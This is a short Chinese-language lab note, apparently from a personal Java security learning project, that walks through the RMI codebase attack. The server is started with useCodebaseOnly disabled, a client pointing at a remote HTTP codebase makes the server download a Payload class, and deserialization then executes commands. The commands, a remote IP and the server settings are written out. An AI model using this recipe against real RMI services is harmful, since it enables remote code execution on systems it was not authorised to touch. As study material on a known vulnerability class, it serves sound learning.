# cmd
```text
EditConfigurations: vm option 添加

java -Djava.rmi.server.hostname=192.168.31.141 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=/.../client.policy com.xjjlearning.hack.java.codebase.RemoteRMIServer
```

# RMIClient执行过程
不要让target目录下存在RMIClient文件, 将ICalc.java, RMIClient.java拿一份到别的地方远离这个工程文件夹, 重新编译一下
```text
mkdir ~/Desktop/com/xjjlearning/hack/java/codebase/
cp RMIClient.java ICalc.java ~/Desktop/com/xjjlearning/hack/java/codebase/
javac ~/Desktop/com/xjjlearning/hack/java/codebase/*.java
```
打包一份到服务器上
```text
scp -r ~/Desktop/com root@47.95.7.37:/root/EXP/
```
进入桌面执行命令
```text
cd ~/Desktop
java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://47.95.7.37:9870/ com.xjjlearning.hack.java.codebase.RMIClient
```
这样server就会去codebase指定的路径找Payload类, 由于payload类连着RMIClient类 所以就一起下载下来了 这样在反序列化的时候就会触发命令执行
